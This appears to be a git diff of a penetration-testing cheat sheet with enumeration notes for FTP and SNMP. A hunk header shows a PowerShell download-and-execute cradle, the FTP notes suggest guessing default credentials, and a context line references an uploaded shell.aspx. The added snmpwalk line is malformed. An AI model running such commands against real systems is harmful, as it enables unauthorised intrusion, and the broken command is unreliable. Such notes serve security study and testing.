@@ -102,6 +102,7 @@ powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('h
 ```
 
 ### FTP (21)
+- https://www.filestash.app/ftp-from-the-command-line.html
 - A few common passwords or usernames (if unknown) such as admin, administrator, root, ftpuser, test etc. should be tried if anonymous authentication is disabled on the remote FTP server
 - common FTP command (https://steflan-security.com/ftp-enumeration-guide/)
 ```bash
@@ -299,7 +300,7 @@ access to https://example.com/path/to/smb/share/shell.aspx
 ### SNMP (161)
 ```bash
 # Enumerate entire MIB tree
-snmp-check <RHOST>
+snmpwalk -v2c -c public {RHOST} nsExtendObjectssnmp-check <RHOST>
 snmpwalk -c public -v1 -t 10 $ip
 snmpcheck -t $ip -c public
 snmpwalk -c public -v1 $ip 1|
